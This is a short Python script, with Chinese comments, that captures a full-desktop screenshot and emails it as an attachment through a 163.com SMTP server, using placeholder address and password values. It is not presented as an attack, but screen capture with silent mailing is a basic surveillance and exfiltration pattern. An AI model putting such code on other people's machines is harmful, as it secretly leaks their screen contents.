# encoding: utf-8
from PIL import ImageGrab
import os
import time
import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email import Encoders

def screenGrab():
    '''截屏保存为jpg文件'''
    im = ImageGrab.grab()
    filename = 'Screenshot_' + time.strftime('%Y%m%d%H%M') + '.jpg'
    im.save(filename, 'JPEG')
    return filename

def sendMail(filename):
    '''发送邮件到指定邮箱'''
    msg = MIMEMultipart()
    msg['Subject'] = filename
    msg['From'] = 'MAILADDRESS'
    msg['To'] = 'MAILADDRESS'

    part = MIMEBase('application', 'octet-stream')
    part.set_payload(open(filename, 'rb').read())
    Encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(filename))
    msg.attach(part)
        
    smail = smtplib.SMTP('smtp.163.com')
    smail.login('MAILADDRESS', 'PASSWORD')
    smail.sendmail('MAILADDRESS', ['MAILADDRESS'], msg.as_string())
    smail.quit()

def main():
    filename = screenGrab()
    sendMail(filename)

if __name__ == '__main__':
    main()